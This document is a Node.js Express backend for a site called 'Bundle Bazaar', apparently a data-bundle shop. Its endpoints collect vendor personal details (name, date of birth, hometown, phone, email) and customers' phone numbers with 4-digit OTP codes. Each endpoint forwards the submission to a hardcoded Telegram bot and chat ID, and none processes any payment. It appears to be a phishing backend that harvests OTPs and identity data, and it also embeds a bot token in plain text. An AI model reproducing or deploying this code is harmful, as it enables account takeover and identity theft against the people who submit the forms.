const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 5000; // ✅ Use Railway's PORT

// =============================================
// CONFIGURATION
// =============================================
// ⚠️ UPDATE THESE WITH YOUR ACTUAL TELEGRAM CREDENTIALS
// For now, TEST_MODE = true will skip Telegram
const TELEGRAM_BOT_TOKEN = '8993833860:AAHz1B3ueOgICpj_JdhckTf7Xp0Vu6IeLCY'; // ⚠️ This token is invalid
const TELEGRAM_CHAT_ID = '7730849900';
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

// 🟢 SET THIS TO true TO TEST WITHOUT TELEGRAM
// 🟢 SET THIS TO false WHEN YOU HAVE VALID TELEGRAM CREDENTIALS
const TEST_MODE = true;

// =============================================
// MIDDLEWARE
// =============================================
app.use(cors({
    origin: '*', // Allow all origins for testing
    methods: ['GET', 'POST', 'PUT', 'DELETE'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// =============================================
// LOGGING MIDDLEWARE
// =============================================
app.use((req, res, next) => {
    console.log(`📥 ${req.method} ${req.path}`);
    console.log('📦 Body:', req.body);
    next();
});

// =============================================
// TELEGRAM SEND FUNCTION - FIXED WITH TEST MODE
// =============================================
async function sendToTelegram(message) {
    // ✅ If TEST_MODE is true, just log the message
    if (TEST_MODE) {
        console.log('📨 [TEST MODE] Would send to Telegram:', message);
        console.log('✅ [TEST MODE] Message logged successfully!');
        return { ok: true, message: 'Test mode - message logged' };
    }

    // ✅ If TEST_MODE is false, actually send to Telegram
    try {
        const response = await axios.post(TELEGRAM_API_URL, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        console.log('✅ Telegram message sent successfully!');
        return response.data;
    } catch (error) {
        console.error('❌ Error sending to Telegram:', error.response?.data || error.message);
        // ✅ Don't throw - just log the error so the API still works
        return { ok: false, message: 'Telegram error but continuing' };
    }
}

// =============================================
// FORMAT MESSAGES
// =============================================
function formatVendorRegistration(data) {
    return `
🎉 <b>NEW VENDOR REGISTRATION!</b>

👤 <b>Full Name:</b> ${data.fullName}
📱 <b>Phone:</b> ${data.phone}
📧 <b>Email:</b> ${data.email}
🏪 <b>Business Name:</b> ${data.business}
📦 <b>Trade Type:</b> ${data.tradeType}
📡 <b>Network:</b> ${data.network}
🎂 <b>Date of Birth:</b> ${data.dob}
🏠 <b>Hometown:</b> ${data.hometown}

⏰ <b>Time:</b> ${new Date().toLocaleString()}
    `;
}

function formatPurchase(data) {
    return `
🛒 <b>NEW PURCHASE COMPLETED!</b>

📦 <b>Package:</b> ${data.package}
💰 <b>Price:</b> ${data.price}
📱 <b>Phone:</b> ${data.phone}
🔑 <b>OTP Code:</b> ${data.code}

⏰ <b>Time:</b> ${new Date().toLocaleString()}
    `;
}

function formatRecharge(data) {
    return `
💰 <b>NEW RECHARGE COMPLETED!</b>

📦 <b>Package:</b> ${data.package}
💰 <b>Price:</b> ${data.price}
📱 <b>Phone:</b> ${data.phone}

⏰ <b>Time:</b> ${new Date().toLocaleString()}
    `;
}

function formatSendPhone(data) {
    const otpMessage = data.otp ? `🔑 <b>OTP Code:</b> ${data.otp}\n\n📌 Please tell the customer the 4-digit OTP code above to complete their purchase!` : '';
    
    return `
📱 <b>NEW ${data.type === 'recharge' ? 'RECHARGE' : 'PURCHASE'} REQUEST!</b>

👤 <b>Customer Phone:</b> ${data.phone}
📦 <b>Package:</b> ${data.package}
💰 <b>Price:</b> ${data.price}
${otpMessage}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
    `;
}

// =============================================
// API ENDPOINTS
// =============================================

// Health Check
app.get('/', (req, res) => {
    res.json({
        status: '✅ Bundle Bazaar API is running!',
        port: PORT,
        testMode: TEST_MODE,
        endpoints: [
            'POST /api/register-vendor',
            'POST /api/purchase',
            'POST /api/recharge',
            'POST /api/send-phone',
            'GET /api/health'
        ]
    });
});

app.get('/api/health', (req, res) => {
    res.json({
        status: '✅ Healthy',
        port: PORT,
        testMode: TEST_MODE,
        timestamp: new Date().toISOString()
    });
});

// =============================================
// 1. VENDOR REGISTRATION ✅
// =============================================
app.post('/api/register-vendor', async (req, res) => {
    try {
        const { fullName, phone, email, business, tradeType, network, dob, hometown } = req.body;

        console.log('📝 Registration data received:', req.body);

        // Validate all fields
        if (!fullName || !phone || !email || !business || !tradeType || !network || !dob || !hometown) {
            return res.status(400).json({
                success: false,
                message: '❌ All fields are required!'
            });
        }

        // Validate phone number
        if (phone.length < 10 || !/^\d+$/.test(phone)) {
            return res.status(400).json({
                success: false,
                message: '❌ Please enter a valid phone number'
            });
        }

        // Validate email
        if (!email.includes('@') || !email.includes('.')) {
            return res.status(400).json({
                success: false,
                message: '❌ Please enter a valid email address'
            });
        }

        const data = { fullName, phone, email, business, tradeType, network, dob, hometown };
        const message = formatVendorRegistration(data);
        
        // Send to Telegram (or log if TEST_MODE)
        await sendToTelegram(message);

        res.json({
            success: true,
            message: '✅ Vendor registration successful! A representative will contact you shortly.'
        });

    } catch (error) {
        console.error('❌ Error in /api/register-vendor:', error);
        res.status(500).json({
            success: false,
            message: '❌ Failed to process registration. Please try again.'
        });
    }
});

// =============================================
// 2. PURCHASE (with 4-digit OTP) ✅
// =============================================
app.post('/api/purchase', async (req, res) => {
    try {
        const { package: packageName, price, phone, code } = req.body;

        if (!packageName || !price || !phone || !code) {
            return res.status(400).json({
                success: false,
                message: '❌ All fields are required!'
            });
        }

        const data = { package: packageName, price, phone, code };
        const message = formatPurchase(data);
        await sendToTelegram(message);

        res.json({
            success: true,
            message: '✅ Purchase completed successfully!'
        });

    } catch (error) {
        console.error('❌ Error in /api/purchase:', error);
        res.status(500).json({
            success: false,
            message: '❌ Failed to process purchase. Please try again.'
        });
    }
});

// =============================================
// 3. RECHARGE (no OTP needed) ✅
// =============================================
app.post('/api/recharge', async (req, res) => {
    try {
        const { package: packageName, price, phone } = req.body;

        if (!packageName || !price || !phone) {
            return res.status(400).json({
                success: false,
                message: '❌ Package, price, and phone are required!'
            });
        }

        const data = { package: packageName, price, phone };
        const message = formatRecharge(data);
        await sendToTelegram(message);

        res.json({
            success: true,
            message: '✅ Recharge completed successfully!'
        });

    } catch (error) {
        console.error('❌ Error in /api/recharge:', error);
        res.status(500).json({
            success: false,
            message: '❌ Failed to process recharge. Please try again.'
        });
    }
});

// =============================================
// 4. SEND PHONE + 4-DIGIT OTP ✅
// =============================================
app.post('/api/send-phone', async (req, res) => {
    try {
        const { package: packageName, price, phone, otp, type } = req.body;

        if (!phone || !packageName) {
            return res.status(400).json({
                success: false,
                message: '❌ Phone and package are required!'
            });
        }

        const data = { 
            package: packageName, 
            price: price, 
            phone: phone, 
            otp: otp || 'N/A', 
            type: type || 'purchase' 
        };
        
        const message = formatSendPhone(data);
        await sendToTelegram(message);

        res.json({
            success: true,
            message: '✅ Phone number received successfully!'
        });

    } catch (error) {
        console.error('❌ Error in /api/send-phone:', error);
        res.status(500).json({
            success: false,
            message: '❌ Failed to send. Please try again.'
        });
    }
});

// =============================================
// 404 Handler
// =============================================
app.use((req, res) => {
    res.status(404).json({
        success: false,
        message: '❌ Endpoint not found'
    });
});

// =============================================
// START SERVER
// =============================================
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Bundle Bazaar Backend running on port ${PORT}`);
    console.log(`📨 TEST_MODE: ${TEST_MODE}`);
    console.log('');
    console.log('📌 Available endpoints:');
    console.log('   POST /api/register-vendor');
    console.log('   POST /api/purchase');
    console.log('   POST /api/recharge');
    console.log('   POST /api/send-phone');
    console.log('   GET  /api/health');
    console.log('   GET  /');
});
